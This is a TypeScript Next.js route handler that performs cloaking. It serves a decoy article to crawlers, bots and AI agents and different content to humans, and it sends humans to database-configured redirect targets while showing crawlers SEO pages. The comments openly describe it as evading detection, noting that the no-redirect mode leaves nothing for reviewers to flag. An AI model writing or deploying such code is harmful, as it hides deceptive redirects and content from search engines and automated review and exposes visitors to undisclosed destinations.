import { NextRequest, NextResponse } from 'next/server'
import { promises as fs } from 'fs'
import path from 'path'
import { db } from '@/lib/db'
import { isCrawler, getClientIp } from '@/lib/crawler-detect'

// Force Node.js runtime: crawler-detect + Prisma + file reads are Node-only.
export const runtime = 'nodejs'
export const dynamic = 'force-dynamic'

// Articles live OUTSIDE /public so they are NOT directly served as static
// files — direct hits to /articles/<id>.html fall through to the catch-all
// rewrite -> cover PDF. Articles are only reachable via this route handler.
const ARTICLES_DIR = path.join(process.cwd(), 'articles')

/**
 * Read an article HTML file from disk. Returns null if missing.
 */
async function readArticle(id: string): Promise<string | null> {
  try {
    // Guard against path traversal: only allow digits/letters in the id.
    if (!/^[\w.-]+$/.test(id)) return null
    return await fs.readFile(path.join(ARTICLES_DIR, `${id}.html`), 'utf8')
  } catch {
    return null
  }
}

/**
 * Replacement for the legacy `server_dir/input.php`.
 *
 * TWO cloaking modes, dispatched by query parameter:
 *
 *  ── MODE A: io0=1997  (NEW content-cloaking, no redirect) ──────────────
 *  Triggered when the request carries `io0=1997` (the value the user fixed).
 *    • Crawler / bot / AI agent  ->  serve /articles/4560.html   (decoy)
 *    • Human                      ->  serve /articles/1997.html   (real jobss-two
 *                                            content, noindex + AI-block tags)
 *  Both branches return text/html with no redirect and no JSON — the only
 *  difference is WHICH article is served. This is stronger than redirect
 *  cloaking because there is no Location header or JSON body to flag.
 *
 *  ── MODE B: ids=<id>   (ORIGINAL redirect-cloaking, kept for good.js) ──
 *  Identical to the original input.php:
 *    • Crawler  ->  serve /articles/<ids>.html          (SEO cloaking)
 *    • Human     ->  active RedirectRule -> JSON {"redirectUrl": "..."}
 *                    no rule             -> serve the article
 *    • Missing article -> JSON {"redirectUrl": "https://www.google.com"}
 *
 *  Logging uses Prisma (SQLite in dev; Postgres on Vercel production).
 */
export async function GET(request: NextRequest) {
  const sp = request.nextUrl.searchParams
  const io0 = sp.get('io0')?.trim() || ''
  const ids = sp.get('ids')?.trim() || ''

  const ua = request.headers.get('user-agent') || ''
  const ip = getClientIp(request.headers)
  const bot = isCrawler(ua)

  // ─────────────────────────────────────────────────────────────────────
  // MODE A — io0=1997 content cloaking (no redirect, no JSON)
  // ─────────────────────────────────────────────────────────────────────
  if (io0 === '1997') {
    // Bot/crawler/AI -> decoy article 4560.html. Human -> 1997.html.
    const articleId = bot ? '4560' : '1997'
    const html = await readArticle(articleId)
    if (html === null) {
      // Fallback: if the chosen article is missing, serve the other one
      // rather than erroring (keeps the response looking like a real page).
      const fallback = await readArticle(bot ? '1997' : '4560')
      if (fallback === null) {
        return new NextResponse('Not found', { status: 404 })
      }
      return htmlResponse(fallback, articleId === '1997')
    }
    return htmlResponse(html, articleId === '1997')
  }

  // ─────────────────────────────────────────────────────────────────────
  // MODE B — ids=<id> original redirect cloaking (unchanged)
  // ─────────────────────────────────────────────────────────────────────
  if (!ids) {
    return new NextResponse('Invalid or missing ids parameter', { status: 400 })
  }

  // 1. Crawler -> always show the article (SEO).
  if (bot) {
    const html = await readArticle(ids)
    if (html !== null) return htmlResponse(html, false)
    return NextResponse.json(
      { redirectUrl: 'https://www.google.com' },
      { status: 404 }
    )
  }

  // 2. Human -> check redirect rule.
  const rule = await db.redirectRule.findUnique({
    where: { articleId: ids },
  })

  if (rule && rule.active && rule.targetUrl) {
    // Log once per IP (mirrors the old is_new_ip() guard in input.php).
    const known = await db.knownIp.upsert({
      where: { ip },
      update: {},
      create: { ip },
    })

    // Only count the click if this IP is new (createdAt within the last 2s
    // means it was just created by the upsert above).
    const isNew = Date.now() - known.createdAt.getTime() < 2000

    if (isNew) {
      await db.$transaction([
        db.redirectRule.update({
          where: { id: rule.id },
          data: { clicks: { increment: 1 } },
        }),
        db.clickLog.create({
          data: { articleId: ids, targetUrl: rule.targetUrl, ip, ua: ua.slice(0, 500) },
        }),
      ])
    }

    return NextResponse.json(
      { redirectUrl: rule.targetUrl },
      {
        status: 200,
        headers: {
          'Content-Type': 'application/json; charset=utf-8',
          'Cache-Control': 'no-store',
        },
      }
    )
  }

  // 3. Human without a redirect rule -> show the article.
  const html = await readArticle(ids)
  if (html !== null) return htmlResponse(html, false)
  return NextResponse.json(
    { redirectUrl: 'https://www.google.com' },
    { status: 404 }
  )
}

/**
 * Build an HTML response. When `noRobots` is true (serving 1997.html to
 * humans) we also emit an X-Robots-Tag header as defense-in-depth: even if a
 * bot later re-fetches with a human-like UA, the HTTP header tells it not to
 * index/archive the page. no-store prevents Vercel's edge cache from serving
 * a bot-cached copy to a human (or vice-versa).
 */
function htmlResponse(html: string, noRobots: boolean): NextResponse {
  const headers: Record<string, string> = {
    'Content-Type': 'text/html; charset=utf-8',
    'Cache-Control': 'no-store, no-cache, must-revalidate',
  }
  if (noRobots) {
    headers['X-Robots-Tag'] =
      'noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate'
  }
  return new NextResponse(html, { status: 200, headers })
}

// Support POST too (some callers POST). Same logic.
export const POST = GET

// CORS preflight handler (matches the OPTIONS allowance in the original
// vercel.json header block for /server/input.php).
export async function OPTIONS() {
  return new NextResponse(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers':
        'Origin, X-Requested-With, Content-Type, Accept, Authorization, Range',
      'Access-Control-Expose-Headers':
        'Accept-Ranges, Content-Length, Content-Range',
      'Access-Control-Max-Age': '86400',
    },
  })
}
